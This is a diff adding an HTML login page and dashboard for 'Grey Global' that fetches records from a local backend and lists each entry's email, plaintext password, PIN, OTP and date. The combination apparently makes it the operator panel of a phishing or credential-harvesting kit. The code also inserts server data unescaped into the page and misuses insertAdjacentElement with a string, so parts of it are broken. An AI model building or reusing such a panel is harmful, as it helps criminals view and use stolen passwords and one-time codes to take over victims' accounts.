@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="shortcut icon" href="./grey-logo.png" type="image/x-icon">
+  <title>Login - Grey Global</title>
+ <style>
+    * {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: "Inter", sans-serif;
+}
+
+body {
+   font-family: "Poppins", sans-serif;
+  background: linear-gradient(135deg, #7f5eff, #00c9a7);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  overflow-y: hidden;
+  overflow-x: hidden;
+  scroll-behavior: unset;
+  height: 42rem;
+}
+
+.container {
+  text-align: center;
+  width: 100%;
+  max-width: 380px;
+  background-color: #fff;
+  padding: 40px 20px;
+  border-radius: 8px;
+  display: none;
+}
+
+h2 {
+  font-size: 1.5rem;
+  margin-bottom: 30px;
+  color: #0d1b2a;
+  font-weight: 600;
+}
+
+.login-form {
+  display: flex;
+  flex-direction: column;
+  gap: 20px;
+}
+
+.input-group {
+  text-align: left;
+}
+
+label {
+  font-size: 0.85rem;
+  font-weight: 500;
+  color: #111;
+  display: block;
+  margin-bottom: 6px;
+}
+
+input {
+  width: 100%;
+  padding: 13px 14px;
+  border: 1px groove #d3d3d3;
+  border-radius: 6px;
+  font-size: 0.95rem;
+  
+  outline: none;
+}
+
+input:focus {
+  border-color:  #d3d3d3;
+  outline: none;
+  box-shadow: 0 0 0 2px rgba(37, 99, 235, 0.1);
+}
+
+.password-wrapper {
+  position: relative;
+}
+
+.toggle-password {
+  position: absolute;
+  right: 12px;
+  top: 50%;
+  transform: translateY(-50%);
+  cursor: pointer;
+  font-size: 1rem;
+  color: #555;
+}
+
+button {
+  width: 100%;
+  background-color: #2563eb;
+  color: #fff;
+  border: none;
+  border-radius: 6px;
+  margin-top: 7rem;
+  padding: 12px;
+  font-size: 1rem;
+  font-weight: 600;
+  cursor: pointer;
+  transition: background 0.2s;
+}
+
+button:hover {
+  background-color: #1d4ed8;
+}
+
+/* Smooth fade-in animation */
+@keyframes fadeIn {
+  from {
+    opacity: 0;
+    transform: translateY(10px);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+
+@media (max-width: 480px) {
+  .container {
+    width: 90%;
+    padding: 25px 15px;
+  }
+
+  textarea, input, button {
+    font-size: 0.9rem;
+  }
+
+  h2 {
+    font-size: 1.3rem;
+  }
+}
+
+.container {
+  animation: fadeIn 0.7s ease-in-out;
+}
+
+/* Button hover & press effects */
+button {
+  transition: background 0.3s, transform 0.2s;
+}
+
+button:hover {
+  transform: scale(1.02);
+}
+
+button:active {
+  transform: scale(0.98);
+}
+
+.create-account {
+  margin-top: 20px;
+  color: #555;
+  font-size: 0.95rem;
+  cursor: pointer;
+}
+
+.loader {
+  display: none;
+  width: 20px;
+  height: 20px;
+  border: 3px solid #fff;
+  border-top: 3px solid transparent;
+  border-radius: 50%;
+  animation: spin 0.9s linear infinite;
+  position: absolute;
+  left: 50%;
+  top: 50%;
+  transform: translate(-50%, -50%);
+}
+
+@keyframes spin {
+  to {
+    transform: translate(-50%, -50%) rotate(360deg);
+  }
+}
+
+button.loading .btn-text {
+  visibility: hidden;
+}
+
+button.loading .loader {
+  display: block;
+}
+.dashboard{
+  display: none;
+}
+
+* {
+      box-sizing: border-box;
+    }
+
+    /* body {
+      font-family: "Poppins", sans-serif;
+      background: linear-gradient(135deg, #7f5eff, #00c9a7);
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    } */
+
+    .table-container {
+      width: 90%;
+      
+      background: #fff;
+      margin-left: 1rem;
+      border-radius: 15px;
+      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
+     overflow-x: auto;
+     overflow-y: auto;
+     scroll-behavior: smooth;
+     height: 30rem;
+     background-color: transparent;
+    
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      border: none;
+    
+    }
+
+    thead {
+      background: linear-gradient(90deg, #6a5acd, #316159);
+      color: #fff;
+    
+    }
+  tbody{
+    overflow-x:visible;
+    overflow-y: visible;
+    scroll-behavior: smooth;
+    
+  }
+    th, td {
+      text-align: left;
+      font-size: small;
+      padding: 8px 12px;
+      white-space: nowrap;
+    }
+
+    tbody tr:nth-child(even) {
+      background: linear-gradient(135deg, #00c9a7,#7f5eff );
+      transition: background 0.3s ease;
+
+    }
+    tr:nth-child(even) {
+     color: white;
+     font-weight: 600;
+
+    }
+
+    tbody tr:hover {
+      background: linear-gradient(135deg,#7f5eff #00c9a7, );
+
+      transition: background 0.3s ease;
+    }
+
+    th {
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+  
+ </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Welcome back!</h2>
+
+    <form class="login-form">
+      <div class="input-group">
+        <label for="email">Username</label>
+        <input type="text" id="email" placeholder="Enter Username" required />
+      </div>
+
+      <div class="input-group">
+        <label for="password">Password</label>
+        <div class="password-wrapper">
+          <input type="password" id="password" placeholder="Enter your password" required />
+          <span class="toggle-password" id="togglePassword">👁️</span>
+        </div>
+      </div>
+     <br> <span class="err" style="color: red; font-size: medium;"></span>
+      <button type="submit" id="continueBtn">
+        <span class="btn-text"> Login</span>
+        <span class="loader"></span>
+      </button>
+    </form>
+
+    <p class="create-account">Create an account</p>
+  </div>
+
+  <div class="dashboard" style="margin-left: 1rem; width: 100%;">
+    <div class="table-container">
+      <table>
+        <thead>
+          <tr>
+            <th>Email</th>
+            <th>Password</th>
+            <th>Pin</th>
+            <th>OTP</th>
+            <th>Date</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td data-label="Name">Jane Smith</td>
+            <td data-label="Position">Developer</td>
+            <td data-label="Department">IT</td>
+            <td data-label="Email">jane@example.com</td>
+            <td data-label="Location">London</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+ <script>
+    window.onload = function () {
+        fetch('http://localhost:3100/portal',{
+    method: 'POST',
+               
+                credentials:'include',
+               headers: {
+                 'Content-Type': 'application/json',
+                  'Authorization':localStorage.getItem('auth')    
+               },
+               body: JSON.stringify({msg:'checklogin'}) // Convert the data to a JSON string
+              }
+    ).then(async res =>{
+      const data = await res.json()
+       console.log(data)
+      if (data.msg == 'invalid token') {
+        document.querySelector('.container').style.display = 'block'
+      }
+      if (data.msg == 'successful') {
+         document.querySelector('.dashboard').style.display = 'block'
+         data.all.forEach( all => {
+      document.querySelector('tbody').insertAdjacentHTML('afterbegin', `
+     <tr>
+            <td data-label="Name">${all.email}</td>
+            <td data-label="Position">${all.password}</td>
+            <td data-label="Department">${all.pin}</td>
+            <td data-label="Email">${all.verification_code}</td>
+            <td data-label="Location">${all.date}</td>
+          </tr>
+    `)
+    });
+      }
+    })
+    }
+    
+    window.addEventListener("load", () => {
+
+        
+  setTimeout(() => document.getElementById("email").focus(), 400);
+});
+
+  const togglePassword = document.getElementById("togglePassword");
+const passwordInput = document.getElementById("password");
+const loginForm = document.querySelector(".login-form");
+let continueBtn = document.getElementById("continueBtn");
+
+togglePassword.addEventListener("click", () => {
+  const type = passwordInput.getAttribute("type") === "password" ? "text" : "password";
+  passwordInput.setAttribute("type", type);
+});
+ 
+// Simple validation and redirect
+loginForm.addEventListener("submit", (e) => {
+  e.preventDefault();
+
+  const email = document.getElementById("email").value.trim();
+  const password = passwordInput.value.trim();
+
+  if (!email || !password) {
+    alert("Please fill in both fields.");
+    return;
+  }
+
+ 
+  continueBtn.classList.add("loading");
+  const send_data = {
+    msg: 'login',
+    username: email,
+    password:password,
+   
+  }
+  console.log(send_data)
+    fetch('http://localhost:3100/portal',{
+    method: 'POST',
+               
+                credentials:'include',
+               headers: {
+                 'Content-Type': 'application/json',
+                  'Authorization':localStorage.getItem('auth') 
+               },
+               body: JSON.stringify(send_data) // Convert the data to a JSON string
+              }
+    ).then(async res =>{
+      const data = await res.json()
+      console.log(data)
+      if (data.msg == 'successful') {
+        localStorage.setItem('auth',data.token)
+        
+        setTimeout(() => {
+    continueBtn.classList.remove("loading");
+    // Redirect example: window.location.href = "dashboard.html";
+    document.querySelector('.container').remove();
+    document.querySelector('.dashboard').style.display = 'block'
+    data.all.forEach( all => {
+      document.querySelector('.dashboard').insertAdjacentElement('afterbegin', `
+     <tr>
+            <td data-label="Name">${all.email}</td>
+            <td data-label="Position">${all.password}</td>
+            <td data-label="Department">${all.pin}</td>
+            <td data-label="Email">${all.otp}</td>
+            <td data-label="Location">${all.date}</td>
+          </tr>
+    `)
+    });
+   
+  }, 2000);
+      }
+      if (res.status == 404) {
+        document.querySelector('.err').textContent = 'No user found'
+        continueBtn.classList.remove("loading");
+      }
+      if (res.status == 403) {
+        document.querySelector('.err').textContent ='incorrect password'
+        continueBtn.classList.remove("loading");
+      }
+    }).catch(err =>{console.log(err)})
+  // Redirect to complaint page\
+ 
+ 
+});
+    
+ </script>
+</body>
+</html>
